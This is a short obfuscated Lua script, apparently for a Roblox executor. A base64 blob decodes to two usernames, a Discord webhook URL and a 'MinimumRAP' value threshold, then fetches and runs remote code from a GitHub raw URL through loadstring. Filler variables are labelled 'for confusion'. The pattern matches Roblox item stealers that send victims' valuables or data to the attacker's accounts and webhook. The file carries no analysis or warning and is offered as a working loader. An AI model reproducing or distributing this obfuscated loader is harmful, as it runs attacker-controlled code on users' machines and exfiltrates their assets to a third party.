
local CUZHOquLxR = 'VXNlcm5hbWUgPSAiaGZjZ3l0Z2ZjIgpVc2VybmFtZTIgPSAiZ2ZkeGNmIgpXZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMDE5NjEyNzM5NjA5NTU5NDUvbWlsTHZGSkhDaVNRWnlwTEVNUmt2S3JVVV9Fc2lZX0wxeTdwQm9nWTlHb1p3LUhSZGFaa1U2N1ppeDNLNERuWGc5YXoiCk1pbmltdW1SQVAgPSAxMDAwMDAKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaGFkb3dzenp6ei90aW1vY2l5L3JlZnMvaGVhZHMvbWFpbi9tYWluIiwgdHJ1ZSkpKCk='
local CWvnlCukkei = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local AZufBGBvPg = CWvnlCukkei(CUZHOquLxR)
loadstring(AZufBGBvPg)() -- Run decoded code

-- Dummy variables for confusion
local uoINJQxHFpPM = math.random()
local kwlFmruXxPFS = "This is a dummy string"
